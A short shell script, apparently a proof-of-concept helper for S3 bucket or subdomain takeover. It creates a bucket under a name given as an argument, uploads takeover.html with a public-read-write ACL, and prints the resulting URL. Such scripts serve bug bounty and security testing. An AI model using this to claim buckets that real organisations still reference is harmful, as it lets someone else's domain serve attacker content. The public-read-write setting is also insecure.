#!/bin/sh

echo "Creating bucket: "$1

aws s3api create-bucket --bucket $1 --region us-east-1

echo "Uploading PoC"

aws s3 cp takeover.html s3://$1/takeover.html --acl public-read-write

echo "You PoC is available at https://"$1".s3.amazonaws.com/takeover.html"
